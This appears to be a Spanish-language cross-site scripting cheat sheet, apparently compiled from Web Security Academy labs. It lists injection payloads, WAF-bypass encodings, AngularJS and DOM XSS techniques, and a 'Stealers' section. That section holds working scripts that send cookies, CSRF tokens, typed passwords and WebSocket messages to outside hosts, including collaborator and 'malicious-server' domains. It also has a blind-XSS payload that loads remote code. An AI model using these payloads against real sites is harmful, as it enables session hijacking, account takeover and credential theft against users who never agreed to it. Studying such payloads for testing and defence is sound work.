-- -
## **bXSS**
```html
<img/src/onerror=import('https://xss0r.com/c/vacasa');//>
```


---

## **Inyecciones Básicas (con Tag Cerrado)**  
```html
<script>alert(1)</script>
<img src="x" onerror="alert('XSS')" />
<iframe src="javascript:alert('XSS');"></iframe>
<svg onload="alert('XSS');"></svg>
<video><source onerror="alert('XSS');"></source></video>
<object data="javascript:alert('XSS');"></object>
<math><annotation-xml encoding="application/xhtml+xml"><script>alert('XSS');</script></annotation-xml></math>
abc’”><><img src=1 onerror=alert(document.cookie)>
```

---

## **Bypass de WAF**  
- **HTML Entities**: `&#60;script&#62;`.  
- **URL Encoding**: `%3Cscript%3E`.  
- **Hex/Unicode**: `\u003Cscript\u003E`.  
- **Double Encoding**: `%26%2360%3Bscript%26%2362%3B`.  

---
## **Payloads segun ocaciones**  
```javascript 
" style="animation-name:swoop-up" onanimationstart="alert(document.domain)
```

**Escapando de los tags originales y poniendo mis propios tags**
```html
"><script>alert(0)</script>
```

**Buscando cargar una imagen erronea para asi generar un error**
```html
<img src=x onerror=alert(0)>
```

**Si se esta utilizando Jquery**
```html
1. #<img src=x onerror=alert(0)>
Si es que se refleja

2. <iframe src="https://URL/#" onload="this.src += '<img src=0 onerror=alert(0)>'"></iframe>
```

**Si vemos que lo que inyectamos se refleja en un `<input>`**
```html
" onmouseover="alert(0)
```

**Si jugamos con la declaracion de variables**
```javascript
'-alert(1)-'
kike'; alert(0); var probando='testing
kike'; alert(0)//
kike\'%2balert(0);// ---> siempre y cuando nos escape la '\'
```

**Si la url esta pasando parametros por post, intentar mandarlos por GET como otro parametro aparte y cerrar los tags en los que esta encasillado**
```python
https://0a680079035eb8ab82f76614006700da.web-security-academy.net/product?productId=1 ---> el servidor envia ahi data por POST en diversos parametros
https://0a680079035eb8ab82f76614006700da.web-security-academy.net/product?productId=1&storeId=</option></select><script>alert(0)</script> ---> Le paso data por que mandaba por POST, solo que por GET, cierro las etquietas y asi se ejecuto el codigo reflejado
```

**Si esta usando AngularJS y vemos la palabra ng-app en el codigo**
```javascript
{{constructor.constructor('alert(1)')()}}
```

**Si nuestra data se refleja en un json y/o se esta ejecutando angularJS, vale la pena probar**
```javascript 
asdas\"-alert(0)}//
```

**Si permite usar body y onresize**
```html
<iframe src="https://0ad6008404cf2e4a805d219f00200007.web-security-academy.net/?search=<body onresize=print()>" onload=this.style.width='100px'></iframe>
```

**Si vemos que no se pueden usar etiquetas comunes, probamos usando etiquetas custom**
```html
<custom id=identifier onfocus=alert(0) tabindex=1>#identifier
```

**Si permite el uso de svg y anchor pero no el href**
```javascript
<svg><animateTransform onbegin=alert(0)>
<svg><a><animate attributeName=href values=javascript:alert(0) /><text x=50 y=50>Click me</text></a>
```

**Si podemos modificar parte de un canonical link tag**
```javascript
https://URL/?'accesskey='x'onclick='alert(0)
```

**Cerrando el tag script en el cual estaba encerrado**
```javascript
</script><script>alert(0)</script>
```

**Abusando del evento onclick con caracteres escapados**
```javascript
http://kike.com&apos;+alert(0)+&apos;
```

**Si la variable se encierra entre backticks:**
```javascript
${alert(0)}
```

**Si esta usando angularJS 1.4.4 y no se puede usar ' ni "**
```javascript
?search=&toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

**Invocar alert escapando del contexto y sin parentesis ni backticks**
```javascript
payload(x=x=>{throw/**/onerror=alert,1337},toString=x,window+'')cierre(,{x:')
```

**Aprovechando una HTMLi para crear un boton malicioso**
```html
my-account?email=prueba"></form><form class="login_form" name="myform" action="https://exploit-0aa900d0042394388054026e017a0088.exploit-server.net/exploit" method="GET"><button class=button type=submit>Click me</button>
```

**Aprovechando insercion en el content CSP**
```html
script-src-elem 'unsafe-inline'
```

### **DOM XSS**
**Aprovechando `window.addEventListener` y `Postmessage`**
```html
<iframe width=600px height=600px src="https://URL/" onload='this.contentWindow.postMessage("<img src=x onerror=alert(0)","*")'></iframe>
```

*Abusando de  location.href*
```html
<iframe width=600px height=600px src="https://URL/" onload='this.contentWindow.postMessage("javascript:alert(0)//https://kike.com","*")'></iframe>
```

*Abusando de json.parse*
```html
<iframe width=600px height=600px src="https://URL/" onload='this.contentWindow.postMessage("{\"type\": \"load-channel\", \"url\": \"javascript:alert(0)\"}","*")'></iframe>
```

*Manipulando cookies y alterando el href*
```html
<iframe src="https://URL/product?productId=3&'><script>alert(0)</script>" onload="if(!window.x)this.src='https://URL';window.x=1;"></iframe>
```

*Explotando DOM Cloberring y DOM purify*
```html
<a id=defaultAvatar>
<a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(0)>//">

<form id=x tabindex=0 onfocus=alert(0)><input id=attributes>
<iframe src="https://URL/post?postId=4" onload="setTimeout(() => this.src += '#x', 500);"></iframe>

```
---
## **Stealers**
### **Cookie stealer**
```javascript
<script>
	fetch("https://URL/?cookie=" + btoa(document.cookie));
</script>
```

### **CSRF stealer**
```javascript
<script>
	var req = new XMLHttpRequest();
	req.open("GET", "/my-account", true);
	req.send();
	
	var response = req.responseText;
	var csrf_token = response.match(/name="csrf" value="(\w+)"/)[1];
	
	var req2 = new XMLHttpRequest();
	req2.open('GET', 'https://d1f1vc0tfn8d4zsygrb2pr4neek58wwl.oastify.com/?response=' + btoa(response), false);
	req2.send();
	
	var req3 = new XMLHttpRequest();
	req3.open('GET', 'https://d1f1vc0tfn8d4zsygrb2pr4neek58wwl.oastify.com/?token=' + btoa(csrf_token), false);
	req3.send();

	var req4 = new XMLHttpRequest();
	req4.open('POST', "/my-account/change-email", true);
	req4.setRequestHeader("Content-Type","application/x-www-form-urlencoded")
	var data = "email=" + encodeURIComponent("pwned@pwned.com") + "&csrf=" + encodeURIComponent(csrf_token);
	req4.send();
	
</script>
```

```javascript
<script> 
	var req = new XMLHttpRequest(); 
	req.onload = handleResponse; 
	req.open('get','/my-account',true);
	req.send(); 
	function handleResponse() { 
		var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; 
		var changeReq = new XMLHttpRequest(); 
		changeReq.open('post', '/my-account/change-email', true); 
		changeReq.send('csrf='+token+'&email=test@test.com') }; 
</script>

```

## **Password stealer**

```javascript
`<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://ugee0gt5d0krro32q1x1km9wun0eo8cx.oastify.com',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">`
```

```javascript
<script>
function hax() {
  var token = document.getElementsByName('csrf')[0].value;
  var username = document.getElementsByName('username')[0].value;
  var password = document.getElementsByName('password')[0].value;

  var data = new FormData();
  data.append('csrf', token);
  data.append('postId', 8);
  data.append('comment', `${username}:${password}`);
  data.append('name', 'victim');
  data.append('email', 'zenshell@zenshell.ninja');
  data.append('website', 'http://www.zenshell.ninja');

  fetch('/post/comment', {
    method: 'POST',
    mode: 'no-cors',
    body: data
  });
}
</script>
```

## **Websocket Steales**

```javascript
<script>
	ws = new WebSocket("https://victim-server/chat")
	
	ws.onopen = function() {
		ws.send("READY");
	}
		
	ws.onmessage = function(event){
		fetch("https://malicious-server.com/?data=" + btoa(event.data))
	}
</script>
```